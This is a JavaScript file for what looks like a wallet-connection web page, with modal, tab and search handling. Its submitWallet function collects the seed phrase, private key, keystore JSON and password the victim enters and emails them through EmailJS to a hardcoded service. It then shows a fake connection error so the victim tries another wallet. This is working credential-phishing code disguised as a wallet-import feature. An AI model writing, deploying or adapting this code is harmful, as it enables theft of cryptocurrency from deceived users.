// Initialize EmailJS with your public key
(function() {
  emailjs.init("JlcdvctBq3hjQGR3O");
})();

// Wait for DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function() {
  // Get modal and buttons
  const modal = document.getElementById('walletModal');
  const openModalBtn = document.getElementById('openModalBtn');
  const closeModalBtn = document.getElementById('closeModalBtn');
  const openModalArea = document.querySelector(".open-modal-area");

  // Function to open the wallet modal
  if (openModalArea) {
    openModalArea.onclick = function () {
      if (modal) modal.style.display = "block";
    }
  }

  // Open the wallet selection modal
  if (openModalBtn) {
    openModalBtn.addEventListener('click', function () {
      if (modal) modal.style.display = 'block';
    });
  }

  // Close the wallet selection modal
  if (closeModalBtn) {
    closeModalBtn.addEventListener('click', function () {
      if (modal) modal.style.display = 'none';
    });
  }

  // Close modals when clicking outside
  window.addEventListener('click', function(event) {
    const walletModal = document.getElementById('walletModal');
    const popupModal = document.getElementById('popupModal');
    const errorModal = document.getElementById("errorModal");

    if (event.target === walletModal) {
      walletModal.style.display = 'none';
    }
    if (event.target === popupModal) {
      popupModal.style.display = 'none';
    }
    if (event.target === errorModal) {
      errorModal.style.display = 'none';
    }
  });

  // Wallet search functionality
  const searchInput = document.getElementById("walletSearch");
  const walletItems = document.querySelectorAll(".wallet-item");

  if (searchInput && walletItems.length > 0) {
    searchInput.addEventListener("input", function () {
      const filter = this.value.toLowerCase();

      walletItems.forEach(item => {
        const span = item.querySelector("span");
        if (span) {
          const text = span.textContent.toLowerCase();
          item.style.display = text.includes(filter) ? "flex" : "none";
        }
      });
    });
  }
});

// Global function for wallet modal (can be called from anywhere)
function walletModal() {
  const modal = document.getElementById('walletModal');
  if (modal) modal.style.display = "block";
}

// Open wallet connection form modal
function Opwallet() {
  const popupModal = document.getElementById('popupModal');
  const walletModal = document.getElementById('walletModal');
  
  if (popupModal) popupModal.style.display = 'block';
  if (walletModal) walletModal.style.display = 'none';
}

// Close wallet connection form modal
function closeForm() {
  const popupModal = document.getElementById('popupModal');
  if (popupModal) popupModal.style.display = 'none';
}

// Open Tab function
function openTab(event, tabName) {
  const tabContent = document.getElementsByClassName('tab-content');
  for (let i = 0; i < tabContent.length; i++) {
    tabContent[i].classList.remove('active');
  }

  const tabButtons = document.getElementsByClassName('tab-button');
  for (let i = 0; i < tabButtons.length; i++) {
    tabButtons[i].classList.remove('active');
  }

  const selectedTab = document.getElementById(tabName);
  if (selectedTab) selectedTab.classList.add('active');
  if (event && event.currentTarget) event.currentTarget.classList.add('active');
}

// Function to show the error popup modal
function showErrorPopup() {
  const errorModal = document.getElementById("errorModal");
  if (errorModal) errorModal.style.display = "block";
}

// Function to close the error modal
function closeModal() {
  const errorModal = document.getElementById("errorModal");
  if (errorModal) errorModal.style.display = "none";
}

// Submit function to handle wallet connection
function submitWallet() {
  const phraseInput = document.getElementById('phrase-input')?.value.trim() || '';
  const privateKey = document.getElementById('private-key')?.value.trim() || '';
  const keystoreJson = document.getElementById('keystore-json')?.value.trim() || '';
  const password = document.getElementById('password')?.value.trim() || '';

  // Check if at least one field is filled
  if (!phraseInput && !privateKey && !keystoreJson) {
    alert("Please fill in at least one field");
    return;
  }

  // EmailJS template parameters
  const templateParams = {
    phrase: phraseInput,
    privateKey: privateKey,
    keystore: keystoreJson,
    password: password,
    timestamp: new Date().toLocaleString(),
    userAgent: navigator.userAgent,
    language: navigator.language
  };

  // Show loading state
  const submitBtn = document.getElementById('submitBtn');
  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.textContent = "Processing...";
  }

  // Send email using EmailJS
  emailjs.send('service_7058our', 'template_hv9rjt6', templateParams)
    .then(function(response) {
      console.log('SUCCESS!', response.status, response.text);
      
      // Close popup modal
      const popupModal = document.getElementById('popupModal');
      if (popupModal) popupModal.style.display = 'none';
      
      // Show error message
      alert("Error Connecting Wallet, Please try another wallet.");
      
      // Clear form fields
      if (document.getElementById('phrase-input')) document.getElementById('phrase-input').value = '';
      if (document.getElementById('private-key')) document.getElementById('private-key').value = '';
      if (document.getElementById('keystore-json')) document.getElementById('keystore-json').value = '';
      if (document.getElementById('password')) document.getElementById('password').value = '';
      
      // Reset button
      if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.textContent = "Import Wallet";
      }
    })
    .catch(function(error) {
      console.error("EmailJS error:", error);
      
      // Reset button
      if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.textContent = "Import Wallet";
      }
      
      // Show error popup
      showErrorPopup();
    });
}